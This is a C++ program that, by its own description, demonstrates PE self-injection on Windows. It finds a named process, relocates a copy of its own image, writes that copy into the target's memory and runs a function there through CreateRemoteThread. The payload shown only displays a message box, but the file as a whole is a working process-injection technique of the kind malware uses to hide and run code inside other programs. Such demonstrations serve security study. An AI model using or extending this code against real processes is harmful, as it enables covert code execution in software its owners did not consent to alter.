/**
* Demonstrates PE injection by injecting itself into another process.
* Supports 32- and 64 Bit applications.
*
*/

#include <stdio.h>
#include <Windows.h>
#include <cstdint>
#include <tlhelp32.h>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


void InjectedFunction()
{
	MessageBoxA(NULL, "Message from payload", "Injected payload", MB_OK);
}

int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	printf("[Info] - My ProcessId %d\n", GetCurrentProcessId());

	processName = argv[1];

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("Error %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("Error %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("Error - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with id %d\n", processName, processEntry.th32ProcessID);

	HMODULE baseAddress = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((int8_t*)baseAddress + dosHeader->e_lfanew);

	int8_t* imageCopy = (int8_t*)malloc(ntHeader->OptionalHeader.SizeOfImage);
	if (!imageCopy)
	{
		printf("[Error] %d - Failed to allocate space for the PE header\n", GetLastError());
		return 1;
	}

	// copy original image
	memcpy(imageCopy, baseAddress, ntHeader->OptionalHeader.SizeOfImage);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	printf("[Info] - Acquired process handle %p\n", targetProcessHandle);

	// allocate remote memory
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// calculate the difference between the original base address and the remote memory as we need to account for it when relocating
	int64_t baseAddressDelta = (int64_t)remoteMemory - (int64_t)baseAddress;

	printf("[Info] - Image baseAddress: %p, remoteAddress: %p, absoluteDelta: %llx\n", baseAddress, remoteMemory, abs(baseAddressDelta));

	// relocate the copy of the image
	PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(imageCopy + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	while (baseRelocation->SizeOfBlock > 0)
	{
		// calculate relocation entries in current block
		int numberOfEntries = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		PBASE_RELOCATION_ENTRY relocationEntry = (PBASE_RELOCATION_ENTRY)(baseRelocation + 1);

		// relocate entries of current block
		for (int i = 0; i < numberOfEntries; i++)
		{
			if (relocationEntry[i].Offset)
			{
				// correct relocation entry by adding the delta between the images
				int64_t* relocationEntryAddress = (int64_t*)(imageCopy + baseRelocation->VirtualAddress + relocationEntry[i].Offset);
				*relocationEntryAddress += baseAddressDelta;
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((int8_t*)baseRelocation + baseRelocation->SizeOfBlock);
	}

	printf("[Info] - Relocated image\n");

	// write relocated copy of image to remote memory
	if (!WriteProcessMemory(targetProcessHandle, remoteMemory, imageCopy, ntHeader->OptionalHeader.SizeOfImage, NULL))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote image to remote process\n");

	// execute the injected function
	int8_t* injectedFunctionRemoteAddress = (int8_t*)InjectedFunction + baseAddressDelta;

	printf("[Info] - Going to execute: %p\n", injectedFunctionRemoteAddress);

	//printf("Press a key to create the remote thread!\n");
	//getchar();

	HANDLE remoteThreadHandle = CreateRemoteThread(targetProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)injectedFunctionRemoteAddress, NULL, 0, NULL);
	if (!remoteThreadHandle)
	{
		printf("[Error] %d - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Created remote thread. Executing %p\n", injectedFunctionRemoteAddress);

	return 0;
}